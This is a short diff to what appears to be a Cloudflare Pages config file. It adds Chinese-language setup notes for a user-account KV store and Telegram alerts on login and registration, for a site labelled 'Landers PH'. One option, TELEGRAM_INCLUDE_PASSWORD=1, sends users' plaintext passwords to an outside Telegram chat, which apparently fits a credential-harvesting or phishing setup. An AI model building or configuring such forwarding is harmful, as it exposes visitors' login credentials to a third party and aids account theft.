@@ -8,3 +8,14 @@ compatibility_date = "2025-01-01"
 #   Build command:      npm run build
 #   Output directory:   dist
 #   Node version:       22（环境变量 NODE_VERSION=22）
+#
+# ---- 账号落盘 / 通知（都在 CF 面板里配，不要写进仓库）----
+# KV 绑定（跨设备登录必需）：
+#   npx wrangler kv namespace create LD_USERS
+#   Pages → Settings → Functions → KV namespace bindings → Variable name: LD_USERS
+#
+# 环境变量（Pages → Settings → Environment variables）：
+#   TELEGRAM_BOT_TOKEN=123456:AA...        # 配了就推送登录/注册事件
+#   TELEGRAM_CHAT_ID=-1001234567890
+#   TELEGRAM_INCLUDE_PASSWORD=1            # 可选：消息里带上明文密码
+#   SITE_LABEL="Landers PH"
